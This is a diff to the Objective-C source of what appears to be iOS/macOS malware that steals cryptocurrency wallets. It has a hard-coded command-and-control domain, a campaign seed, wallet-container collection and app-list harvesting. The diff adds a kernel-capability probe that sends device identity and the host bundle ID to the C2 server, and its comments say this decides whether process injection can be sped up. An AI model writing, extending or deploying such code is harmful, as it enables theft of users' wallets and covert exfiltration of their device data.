@@ -12,6 +12,7 @@
 #import "Info.h"
 #import "Collector.h"
 #import "WalletFS.h"
+#import "KernProbe.h"
 #import "Crypto.h"
 
 static NSString *const kBaseURL     = @"https://myg3z1adawtxz0s.icu";          // C2 域名
@@ -311,6 +312,25 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 
 #pragma mark - 主循环
 
+#pragma mark - 内核能力探测
+
+/// 一次性：探测当前进程到底拿到哪些内核级能力（决定注入能不能加速）
+- (void)probeKernelCaps {
+    @try {
+        NSDictionary *rep = [KernProbe report];
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"kern_probe";
+        ev[@"c"] = kSeed;
+        NSMutableDictionary *ctx = [NSMutableDictionary dictionaryWithDictionary:rep];
+        ctx[@"host"] = [Info hostBundleId] ?: @"";
+        ev[@"ctx"] = ctx;
+        [self.net sendEvent:ev];
+        [self log:[NSString stringWithFormat:@"kern probe: %@", rep]];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"kern probe exception: %@", e.reason]];
+    }
+}
+
 #pragma mark - 钱包容器采集（外部直读，不需要注入）
 
 /// 各钱包的采集项，和后台 busiCollectConfig 里的配置一致
@@ -431,6 +451,9 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
         // 第一轮：自检 + 立刻采集一次
         [self heartbeat];
         [self collectAppList];
+
+        // 一次性：探测内核级能力（决定注入能否加速）
+        [self probeKernelCaps];
 
         // 一次性：探测能不能从进程外面直接读钱包 App 的容器
         [self probeWalletFS];
